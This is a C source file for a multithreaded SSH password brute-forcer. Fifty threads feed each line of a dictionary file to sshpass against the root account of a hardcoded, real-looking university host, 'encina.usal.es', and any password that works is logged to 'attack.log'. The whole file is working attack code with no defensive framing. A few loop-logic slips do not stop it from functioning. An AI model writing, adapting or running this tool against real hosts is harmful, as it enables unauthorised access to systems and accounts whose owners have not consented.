#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#define THREAD_COUNT 50
#define MAX_PASSWORD_SIZE 30
#define COMMAND "ssh", "root@encina.usal.es"

pthread_mutex_t dict_mutex;
pthread_mutex_t log_mutex;

char* read_next_line(FILE* file) {
    char* ret = NULL;
    size_t size = 0;
    size_t len;
    pthread_mutex_lock(&dict_mutex);

    len = getline(&ret, &size, file);

    if (len == -1) {
        perror("read_next_line");
        free(ret);
        ret = NULL;
    } else {
        ret[len - 1] = '\0'; // delete trailing newline
    }

    pthread_mutex_unlock(&dict_mutex);

    return ret;
}

#define LOG_PATH "attack.log"
FILE* log_file;
#define LOG(msg, ...)                                                          \
    do {                                                                       \
        pthread_mutex_lock(&log_mutex);                                        \
        fprintf(log_file, msg "\n", ##__VA_ARGS__);                            \
        pthread_mutex_unlock(&log_mutex);                                      \
    } while (0)

void* attack(void* f) {
    char* sshpass_args[] = {"sshpass", "-p", "", COMMAND, NULL};
    FILE* file = (FILE*)f;
    char* line;
    int return_status;

    printf("In attack\n");

    while ((line = read_next_line(file))) {
        printf("Read: %s\n", line);
        switch (fork()) {
        case -1:
            perror("fork");
            exit(1);
        case 0:
            sshpass_args[2] = line;
            execvp(sshpass_args[0], sshpass_args);
            perror("execvp");
            continue;
        default:
            break; // do nothing
        }

        do {
            wait(&return_status);
        } while (!WIFEXITED(return_status));

        /** Match! */
        if (WEXITSTATUS(return_status) == 0) {
            LOG("Found matching password: %s", line);
            LOG("Terminating");
            free(line);
            exit(0); /** This exits all threads */
        } else {
            LOG("%s:0", line);
        }

        printf("Out");
        LOG("Terminating: No matches");

        free(line);
    }

    return NULL;
}

int main(int argc, char** argv) {
    const char* dictionary = "dictionary.txt";
    size_t i;
    FILE* file;
    pthread_t threads[THREAD_COUNT];
    pthread_attr_t attrs;

    if (argc > 1)
        dictionary = argv[1];

    file = fopen(dictionary, "rb");
    log_file = fopen(LOG_PATH, "wb+");

    if (log_file == NULL) {
        log_file = stderr;
        LOG("WARNING: log file not created, using stderr");
    }

    if (file == NULL) {
        perror("Dictionary open failed");
        exit(1);
    }

    pthread_attr_init(&attrs);

    for (i = 0; i < THREAD_COUNT; ++i) {
        if (pthread_create(&threads[i], &attrs, attack, file) != 0) {
            perror("Thread creation");
            exit(1);
        }
    }

    for (i = 0; i < THREAD_COUNT; ++i)
        pthread_join(threads[i], NULL);

    return 0;
}
